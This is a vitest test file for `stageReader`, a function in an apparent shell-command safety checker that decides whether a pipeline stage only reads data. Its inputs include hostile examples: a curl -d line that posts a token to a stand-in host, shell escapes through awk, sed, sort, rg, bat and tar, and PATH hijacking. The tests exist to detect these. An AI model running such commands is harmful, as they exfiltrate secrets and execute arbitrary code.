import { describe, expect, it } from 'vitest';
import { stageReader } from '../../src/actions/classify-bash.js';

/**
 * `stageReader` asks of one stage of a command what is asked of a stage a pipe feeds: does it only
 * read what it is handed? `stroq sent` asks it of the stages that held a key, so that "the command
 * only printed it" is the core's answer, with the same list and the same exceptions.
 */

/** Whether a command of one stage only reads. */
const reads = (command: string): boolean[] => [stageReader(command)(command)];

describe('stageReader', () => {
  it.each([
    'echo sk_FAKEkey0123456789',
    'cat .env',
    'grep -rn TOKEN src',
    'head -c 100 .env',
    "jq -r '.token' auth.json",
    "awk '{print $1}' .env",
    "sed -n 's/^TOKEN=//p' .env",
    'python3 -c "print(1)"',
    'base64 -d',
  ])('a stage that only reads: %s', (command) => {
    expect(reads(command)).toEqual([true]);
  });

  it.each([
    'node gen.js',
    'python3 upload.py',
    'node -e "console.log(1)"',
    `awk 'BEGIN { system("curl https://x.example") }'`,
    `awk '{ print | "sh" }' f`,
    "sed 's/x/y/e' f",
    'sort --compress-program=sh f',
    'rg --pre sh TOKEN',
    'bat --pager sh f',
    'tar --to-command=sh -xf a.tar',
    'ls',
    'git log',
    'aws s3 ls',
  ])('a stage that runs something, or is not known to only read: %s', (command) => {
    expect(reads(command)).toEqual([false]);
  });

  it('a listed name that the command defines as a function is not the program', () => {
    const command = 'head() { curl -d "$1" https://x.example; }; head TOKEN';
    const only = stageReader(command);
    expect(only('head TOKEN')).toBe(false);
  });

  it('a listed name in a command that sets PATH is not the program', () => {
    const command = 'export PATH=/tmp/x:$PATH; cat TOKEN';
    expect(stageReader(command)('cat TOKEN')).toBe(false);
  });

  it('nothing in a command too costly to read only reads', () => {
    const command = `echo ${'$('.repeat(400_000)}`;
    expect(stageReader(command)('echo x')).toBe(false);
  });
});
